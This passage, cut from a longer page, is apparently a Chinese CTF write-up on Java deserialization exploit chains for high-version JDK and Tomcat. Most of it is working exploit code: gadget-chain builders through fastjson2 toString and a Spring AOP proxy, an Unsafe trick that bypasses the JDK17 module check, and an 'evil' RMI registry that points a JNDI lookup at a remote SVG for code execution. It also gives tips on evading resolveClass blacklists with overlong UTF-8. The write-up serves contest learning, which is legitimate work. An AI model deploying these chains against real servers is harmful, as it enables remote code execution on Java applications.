class="hljs-comment">//toString触发到getter方法</span><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(pojoNode);<br>        setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        System.out.println(base64Encode(serialize(list)));<br><br>        deserialize(serialize(list));<br><br>    &#125;<br>    <br>    <span class="hljs-comment">//HashMap打Spring的原生toString链</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object v1, Object v2 )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br></code></pre></td></tr></table></figure><p>UnSafeTools：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSafeTools</span> &#123;<br>    <span class="hljs-keyword">static</span> Unsafe unsafe;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UnSafeTools</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        unsafe = (Unsafe)field.get((Object)<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> unsafe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setObject</span><span class="hljs-params">(Object o, Field field, Object value)</span> &#123;<br>        unsafe.putObject(o, unsafe.objectFieldOffset(field), value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newClass</span><span class="hljs-params">(Class c)</span> <span class="hljs-keyword">throws</span> InstantiationException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(c);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bypassModule</span><span class="hljs-params">(Class src, Class dst)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getModule</span> <span class="hljs-operator">=</span> dst.getDeclaredMethod(<span class="hljs-string">&quot;getModule&quot;</span>);<br>        getModule.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> getModule.invoke(dst);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.getAndSetObject(src, addr, <span class="hljs-keyword">module</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            unsafe = (Unsafe)field.get((Object)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var1) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Error: &quot;</span> + var1);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当然<a href="https://xz.aliyun.com/news/16917?time__1311=eqUxnDRD0Dg0KAKDtD/Wn+xQw9AGrbqHq4D&u_atoken=f1b820af46009ed0c00f45f20fab3b16&u_asig=0a472f4317433405694282937e00b1">Hashtable</a>这条链：也能通：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">hashtable#readObject<br>=&gt;TextAndMnemonicHashMap#get<br>=&gt;fastjson2.toString<br>=&gt;OracleCachedRowSet.getConnection()<br></code></pre></td></tr></table></figure><p>只不过跟Jackson不稳定链是类似的，还需要加个<code>JdkDynamicAopProxy</code>类指定<code>OracleCachedRowSet</code>的接口来进行对<code>getConnection</code>的稳定触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        unsafe_break_jdk17();<br>        <span class="hljs-comment">// sink</span><br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br>        oracleCachedRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://127.0.0.1:1097/remoteobj&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(oracleCachedRowSet);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        objects.add(proxy);<br><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashMapXStringToString</span> <span class="hljs-operator">=</span> makeTableTstring(objects);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">serialize</span> <span class="hljs-operator">=</span> serialize(hashMapXStringToString);<br><span class="hljs-comment">//            System.out.println(serialize);</span><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">deserialize</span> <span class="hljs-operator">=</span> deserialize(serialize);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unsafe_break_jdk17</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//获取Object的module</span><br>        <span class="hljs-type">Module</span> <span class="hljs-variable">objectmodule</span> <span class="hljs-operator">=</span> Object.class.getModule();<br>        <span class="hljs-comment">//获取当前类对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">mainClass</span> <span class="hljs-operator">=</span> Exp_Hashtable.class;<br>        <span class="hljs-comment">//获取在class中module的偏移量</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        <span class="hljs-comment">//设置module</span><br>        unsafe.getAndSetObject(mainClass,<span class="hljs-keyword">module</span>,objectmodule);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(payload);<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] data = Base64.getDecoder().decode(payload);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data)).readObject();<br>    &#125;<br>    <span class="hljs-comment">//反射改值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getSuperclass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;RowSetInternal.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxyObj;<br>    &#125;<br><br>    <span class="hljs-comment">//hashtable.readObject  ---&gt; TextAndMnemonicHashMap.get ----&gt; obj.toString</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTableTstring</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (HashMap) createWithoutConstructor(Class.forName(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (HashMap) createWithoutConstructor(Class.forName(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));<br>        tHashMap1.put(o,<span class="hljs-string">&quot;yy&quot;</span>);<br>        tHashMap2.put(o,<span class="hljs-string">&quot;zZ&quot;</span>);<br>        setValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>        setValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(tHashMap1,<span class="hljs-number">1</span>);<br>        hashtable.put(tHashMap2,<span class="hljs-number">1</span>);<br><br>        tHashMap1.put(o, <span class="hljs-literal">null</span>);<br>        tHashMap2.put(o, <span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> hashtable;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithoutConstructor</span><span class="hljs-params">(Class&lt;T&gt; classToInstantiate)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        <span class="hljs-keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithConstructor</span><span class="hljs-params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="hljs-built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;<br>        Constructor&lt;? <span class="hljs-built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);<br>        objCons.setAccessible(<span class="hljs-literal">true</span>);<br>        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);<br>        sc.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (T) sc.newInstance(consArgs);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="EXP-JNDI"><a href="#EXP-JNDI" class="headerlink" title="EXP-JNDI"></a>EXP-JNDI</h3><p>首先是注意到依赖的tomcat是10.1.31：</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331164726885.png" alt="image-20250331164726885"></p><p>而Tomcat 在<code>9.0.62</code>后在<code>BeanFactory</code>里对<code>forceString</code>进行了判断，所以想直接打<code>BeanFactory</code>的JNDI老路已经不太彳亍了。</p><p>我们必须找一个新的sink点，可看：<a href="https://xz.aliyun.com/news/16156?time__1311=eqUxnQiteDT4ulDl2mPuqg7DO8Cdx&u_atoken=377b40a8f18f8ba97d1e964e2cc03a6b&u_asig=0a472f8317434109012967899e0048">高版本JNDI注入-高版本Tomcat利用方案-先知社区</a></p><p>但是文章的sink点这道题用不了emmm，还得自己找一个。</p><p>据说可以从<code>RMIServer</code>打一个XXE来任意文件读取，但是我没有尝试，因为我想R哈哈哈哈哈。</p><p>集思广益，还真找到了一个<a href="https://mp.weixin.qq.com/s/fZtDvpyAo-UZRE9MhfB0VQ">CVE-2022-39197分析</a>，这是一个CS的洞，Sink点是<code>JSVGCanvas#setURL</code>，我们可以做到svg2RCE。</p><p>之前说到高版本tomcat不能直接打<code>BeanFactory</code>因为<code>forceString</code>被ban了，但是通过<code>JavaBeans Introspector</code> 实现获取任意类的bean之后，就可以调用任意类的的setter方法。</p><p>我了个豆啊。那可以直接调用任意setter传参了，那不就能触发到<code>batik-swing</code>中<code>JSVGCanvas#setURL</code>了，直接就通了。</p><p>（srds这个batik-swing确实是远古版本的玩意，还得去网上下）</p><p>与此同时，这个洞后续还被发扬光大了，于是就找到了CVE-2023-21939：<a href="https://mp.weixin.qq.com/s?__biz=MzkzOTQzOTE1NQ==&mid=2247483750&idx=1&sn=12a793075d0a8713bbfb4341b3591628&chksm=c2f1a43af5862d2cc898be9e4b43b24d24b29173501d3c10d812a8fcb7dd25d858e3095969ea#rd">JDK CVE-2023-21939 分析利用</a></p><h3 id="EXP-RMIServer"><a href="#EXP-RMIServer" class="headerlink" title="EXP_RMIServer"></a>EXP_RMIServer</h3><p>没啥好说的，就是提供一个打JNDI的RMIServer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer_JDBCParty</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;Creating evil RMI registry on port 1097&quot;</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1097</span>);<br><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.apache.batik.swing.JSVGCanvas&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;URI&quot;</span>, <span class="hljs-string">&quot;http://localhost:8886/1.xml&quot;</span>));<br><br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;remoteobj&quot;</span>, referenceWrapper); <span class="hljs-comment">//Client处访问rmi://localhost:1097/remoteobj</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用CVE-2023-21939的现成server直接起，只是svg直接触发好像有点问题，打jar包的形式倒是可以一遍通：</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331171010321.png" alt="image-20250331171010321"></p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331171039372.png" alt="image-20250331171039372"></p><p>当然还搜到有<code>Jackson+LdapAttruibute</code>的方法能打，具体看看这位师傅写的吧：<a href="https://gsbp0.github.io/post/jdk17%E6%89%93jackson+ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JDK17打Jackson+LdapAttruibute反序列化 | GSBP’s Blog</a></p><p>三折叠，怎么折都有面啊😋😋😋</p><p>参考：</p><p><a href="https://j1rry-learn.github.io/posts/%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9Bjdbcparty-%E5%AD%A6%E4%B9%A0%E9%AB%98%E7%89%88%E6%9C%ACjdk%E5%92%8C%E9%AB%98%E7%89%88%E6%9C%ACtomcat%E6%89%93jndi%E5%88%B0rce/#cve-2022-39197">从2025系统安全防护赛JDBCParty学习高版本JDK和高版本Tomcat打JNDI到RCE | J1rrY’s Blog</a></p><p><a href="https://xz.aliyun.com/news/16917?time__1311=eqUxnDRD0Dg0KAKDtD/Wn+xQw9AGrbqHq4D&u_atoken=f1b820af46009ed0c00f45f20fab3b16&u_asig=0a472f4317433405694282937e00b1">软件攻防赛JDBCParty赛后解-先知社区</a></p><p><a href="https://github.com/Y4Sec-Team/CVE-2023-21939/tree/main">Y4Sec-Team&#x2F;CVE-2023-21939: JDK CVE-2023-21939</a></p><h1 id="其二-软件安全赛半决-justDeserialize"><a href="#其二-软件安全赛半决-justDeserialize" class="headerlink" title="其二-软件安全赛半决-justDeserialize"></a>其二-软件安全赛半决-justDeserialize</h1><p>JDK11打hsqldb的反序列化。</p><p>比赛是break&amp;fix类型，修是很好修的，框框加blacklist或者重写<code>resolveClass</code>都行，或User类的compare方法ban掉，这是一个很显然的拿来反序列化触发的方法点位。当时硬磕了半天还是没打通，绕<code>resolveClass</code>原有黑名单想到了UTF8-Overlong-Encoding，也想到了JNDI的打法，奈何本地环境遇到点问题测不出来。。。</p><p>赛后也有师傅复现了，那我也看看怎么个事吧。</p><p>打的是<code>SpringAOP</code>链，来自：<a href="https://gsbp0.github.io/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/#%E7%AC%AC%E4%BA%8C%E6%AD%A5">软件攻防赛现场赛上对justDeserialize攻击的几次尝试 | GSBP’s Blog</a></p><p>用的toString来触发aop动态代理的invoke方法，只要不是<code>equals,hashcode</code>这俩方法触发invoke,其他都是可以走完整条反序列化链。</p><p>而User类的<code>compare</code>方法可以使用CB链中的<code>PriorityQueue</code>的那节来触发。</p><p>但是直接触发是不太彳亍的，因为proxy类没有实现<code>comparator</code>接口，解决方法是通过在外面再包一层代理，且代理<code>comparator</code>接口。</p><p>至于触发类，我们可以选择<code>LdapAttribute</code>这么一个jndi注入类，也可以选择<code>JdbcRowSetImpl</code>。</p><p>虽然高版本JDK你直接调<code>com.sun.rowset.JdbcRowSetImpl</code>会报错，但是这题你在JDK8下调好payload发包过去照样能成功。</p><p>打JNDI的话，用JNDIMap就可以，但是直接打waf的测试好像过不了，反正套个UTF8就能绕<code>resolveClass</code>。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><h4 id="法一，JdbcRowSetImpl"><a href="#法一，JdbcRowSetImpl" class="headerlink" title="法一，JdbcRowSetImpl"></a>法一，<code>JdbcRowSetImpl</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 